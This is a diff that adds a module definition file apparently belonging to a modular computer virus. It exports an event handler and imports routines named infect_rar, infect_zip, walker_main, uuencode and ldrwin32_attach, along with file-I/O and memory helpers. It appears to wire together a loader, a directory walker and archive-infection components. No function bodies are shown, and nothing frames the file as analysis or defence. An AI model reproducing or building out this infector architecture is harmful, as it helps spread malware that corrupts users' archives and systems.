@@ -1,0 +1,27 @@
+
+EXPORTS
+   HandleEvent
+
+IMPORTS
+   Event    = @LDRWIN32.Event
+
+   ldrwin32_attach = @LDRWIN32.ldrwin32_attach
+
+   addpgn_attach = @ADDPGN.addpgn_attach
+
+   fcreate  = @FILEIO.fcreate
+   fopen_ro = @FILEIO.fopen_ro
+   fclose   = @FILEIO.fclose
+   fgetsize = @FILEIO.fgetsize
+   fread    = @FILEIO.fread
+   fwrite   = @FILEIO.fwrite
+
+   malloc   = @MEMORY.malloc
+   mfree    = @MEMORY.mfree
+
+   infect_rar = @RARZIP.infect_rar
+   infect_zip = @RARZIP.infect_zip
+
+   uuencode = @UUE.uuencode
+
+   walker_main = @WALKER.walker_main
